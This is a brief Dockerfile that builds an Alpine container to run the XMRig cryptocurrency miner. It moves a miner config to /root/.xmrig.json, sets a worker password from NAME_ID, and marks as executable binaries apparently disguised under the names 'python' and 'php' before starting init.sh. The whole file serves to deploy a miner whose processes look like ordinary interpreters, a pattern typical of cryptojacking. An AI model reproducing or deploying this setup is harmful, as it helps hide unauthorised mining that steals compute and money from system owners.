FROM alpine
COPY * /
USER root

RUN if [ -z "$NAME_ID" ]; then \
    NAME_ID="NONE"; \
  fi

RUN apk update \
  && apk upgrade \
  && apk add bash
RUN chmod a+x python php init.sh
RUN mv config.json /root/.xmrig.json
RUN sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /root/.xmrig.json


CMD ./init.sh